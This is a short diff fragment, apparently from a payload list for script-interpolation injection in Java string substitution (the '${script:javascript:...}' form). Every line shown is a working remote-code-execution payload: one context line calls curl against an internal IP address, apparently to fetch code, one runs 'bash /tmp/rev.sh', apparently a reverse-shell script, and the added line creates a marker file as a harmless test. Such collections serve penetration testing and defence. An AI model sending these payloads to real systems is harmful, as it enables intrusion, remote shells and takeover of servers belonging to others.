@@ -3,3 +3,5 @@ ${script:javascript:java.lang.Runtime.getRuntime().exec('curl -s http://172.17.0
 ${script:javascript:java.lang.Runtime.getRuntime().exec('bash /tmp/rev.sh')}
 
 
+${script:javascript:java.lang.Runtime.getRuntime().exec('touch /dev/shm/PayloadTestingHack')}
+
